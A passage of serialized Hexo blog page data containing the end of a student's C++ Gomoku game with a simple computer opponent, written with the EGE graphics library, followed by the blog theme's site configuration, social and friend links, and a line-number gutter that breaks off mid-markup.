class=\"number\">40</span> + <span class=\"number\">1</span>, msg.y / <span class=\"number\">40</span> + <span class=\"number\">1</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (Checker())<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">Menu</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">45</span>, <span class=\"number\">50</span>));</span><br><span class=\"line\">\tsetfont(<span class=\"number\">130</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;华文新魏&quot;</span>);</span><br><span class=\"line\">\txyprintf(<span class=\"number\">150</span>, <span class=\"number\">60</span>, <span class=\"string\">&quot;五  子  棋&quot;</span>);</span><br><span class=\"line\">\tsetbkcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\tsetfillcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">122</span>, <span class=\"number\">204</span>));</span><br><span class=\"line\">\tbar(<span class=\"number\">300</span>, <span class=\"number\">230</span>, <span class=\"number\">500</span>, <span class=\"number\">280</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">300</span>, <span class=\"number\">300</span>, <span class=\"number\">500</span>, <span class=\"number\">350</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">300</span>, <span class=\"number\">370</span>, <span class=\"number\">500</span>, <span class=\"number\">420</span>);</span><br><span class=\"line\">\tsetbkmode(TRANSPARENT);</span><br><span class=\"line\">\tsetfont(<span class=\"number\">40</span>, <span class=\"number\">15</span>, <span class=\"string\">&quot;华文楷体&quot;</span>);</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\tsetfontbkcolor(EGERGB(<span class=\"number\">30</span>, <span class=\"number\">30</span>, <span class=\"number\">130</span>));</span><br><span class=\"line\">\touttextxy(<span class=\"number\">320</span>, <span class=\"number\">235</span>, <span class=\"string\">&quot;人机对战&quot;</span>);</span><br><span class=\"line\">\touttextxy(<span class=\"number\">320</span>, <span class=\"number\">305</span>, <span class=\"string\">&quot;好友对战&quot;</span>);</span><br><span class=\"line\">\touttextxy(<span class=\"number\">320</span>, <span class=\"number\">375</span>, <span class=\"string\">&quot;退出游戏&quot;</span>);</span><br><span class=\"line\">\tsetfont(<span class=\"number\">30</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;华文楷体&quot;</span>);</span><br><span class=\"line\">\touttextxy(<span class=\"number\">230</span>, <span class=\"number\">480</span>, <span class=\"string\">&quot;制作人：计实验17-1郭永航&quot;</span>);</span><br><span class=\"line\">\tsetfont(<span class=\"number\">20</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;方正舒体&quot;</span>);</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\touttextxy(<span class=\"number\">190</span>, <span class=\"number\">600</span>, <span class=\"string\">&quot;Copyright (C) 2018 Gomoku. All Rights Reserved.&quot;</span>);</span><br><span class=\"line\">\tmouse_msg msg;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (; is_run();)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tmsg = getmouse();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (msg.is_up())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (msg.x &gt;= <span class=\"number\">300</span> &amp;&amp; msg.x &lt;= <span class=\"number\">500</span> &amp;&amp; msg.y &gt;= <span class=\"number\">230</span> &amp;&amp; msg.y &lt;= <span class=\"number\">280</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcleardevice();</span><br><span class=\"line\">\t\t\t\tChessBoard();</span><br><span class=\"line\">\t\t\t\tGameAI();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.x &gt;= <span class=\"number\">300</span> &amp;&amp; msg.x &lt;= <span class=\"number\">500</span> &amp;&amp; msg.y &gt;= <span class=\"number\">300</span> &amp;&amp; msg.y &lt;= <span class=\"number\">350</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcleardevice();</span><br><span class=\"line\">\t\t\t\tChessBoard();</span><br><span class=\"line\">\t\t\t\tGamePeople();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.x &gt;= <span class=\"number\">300</span> &amp;&amp; msg.x &lt;= <span class=\"number\">500</span> &amp;&amp; msg.y &gt;= <span class=\"number\">370</span> &amp;&amp; msg.y &lt;= <span class=\"number\">420</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tclosegraph();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">Choice</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetfillcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\tbar(<span class=\"number\">10</span>, <span class=\"number\">150</span>, <span class=\"number\">90</span>, <span class=\"number\">180</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">10</span>, <span class=\"number\">200</span>, <span class=\"number\">90</span>, <span class=\"number\">230</span>);</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\tsetfont(<span class=\"number\">20</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;宋体&quot;</span>);</span><br><span class=\"line\">\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">155</span>, <span class=\"string\">&quot;再来一局&quot;</span>);</span><br><span class=\"line\">\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">205</span>, <span class=\"string\">&quot;返回菜单&quot;</span>);</span><br><span class=\"line\">\tmouse_msg msg;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (; is_run();)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tmsg = getmouse();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (msg.is_up())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (msg.x &gt;= <span class=\"number\">10</span> &amp;&amp; msg.x &lt;= <span class=\"number\">90</span> &amp;&amp; msg.y &gt;= <span class=\"number\">150</span> &amp;&amp; msg.y &lt;= <span class=\"number\">180</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcleardevice();</span><br><span class=\"line\">\t\t\t\tChessBoard();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (key)GamePeople();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> GameAI();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.x &gt;= <span class=\"number\">10</span> &amp;&amp; msg.x &lt;= <span class=\"number\">90</span> &amp;&amp; msg.y &gt;= <span class=\"number\">200</span> &amp;&amp; msg.y &lt;= <span class=\"number\">230</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcleardevice();</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (Menu())<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetinitmode(INIT_RENDERMANUAL);</span><br><span class=\"line\">\tinitgraph(<span class=\"number\">800</span>, <span class=\"number\">640</span>);</span><br><span class=\"line\">\tsetcaption(<span class=\"string\">&quot;五子棋&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (Menu())<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (!Choice());</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":14795,"excerpt":"<blockquote>\n<p>C++课程设计作业，包含人工智障$AI$</p>\n</blockquote>","more":"<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span 